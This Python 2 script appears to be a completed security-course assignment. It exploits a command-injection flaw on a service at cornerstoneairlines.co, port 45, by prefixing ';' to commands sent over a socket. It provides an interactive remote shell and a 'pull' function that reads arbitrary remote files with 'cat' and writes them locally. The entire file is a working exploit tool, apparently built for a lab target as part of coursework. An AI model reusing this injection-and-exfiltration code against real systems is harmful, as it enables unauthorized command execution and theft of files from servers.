"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import re
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    regex = re.match('^\s*(\w*)\s*([A-Za-z0-9.\/\-\_]*)\s*([A-Za-z0-9.\/\-\_]*)\s*$', cmd)
    val = regex.group(1)
#    print('val: %s' % val)
    if val == 'shell':
        path = '/'
        while True:
            usr_in = raw_input(path + ">")
            if usr_in == 'exit':
                break
            command = ';' + ' cd ' + path + '; ' + usr_in
            if ('cd' in usr_in):
#                print('here')
                reg = re.match('^\s*cd\s*([A-Za-z0-9.\/\-\_]*)\s*$', usr_in)
                if (reg.group(1) == ''):
                    path = '/'
                elif (reg.group(1)[0] == '/'):
                    path = reg.group(1)
                else:
                    path += reg.group(1)
                if (path[-1] != '/'):
                    path += '/'
#            print('command: "%s"' % command)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            data = s.recv(1024)
            time.sleep(2)
#            print('%s' % data)
            s.send(command + '\n')
            time.sleep(2)
#            print('"%s" sent' % command)
            data = s.recv(1024)
            print('%s' % data)
            s.close()
    elif val == 'pull':
        command = '; ' + 'cat ' + regex.group(2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        time.sleep(2)
        s.send(command + '\n')
        time.sleep(2)
#        print('"%s" sent' % command)
        data = s.recv(1024)
#        print('%s' % data)
        s.close()
        f = open(regex.group(3), 'w')
        f.write(data)
        f.close()
    elif val == 'quit':
        return -1
    elif val == 'help':
        print('shell - Drop into an interactive shell - exit with "exit"')
        print('pull <remote path> <local path> - download files')
        print('help - show the help menu')
        print('quit - quit this program')
    else:
        print('invalid command')

    return 0




if __name__ == '__main__':
    while True:
        cmd = raw_input('>')
        if execute_cmd(cmd) == -1:
            break


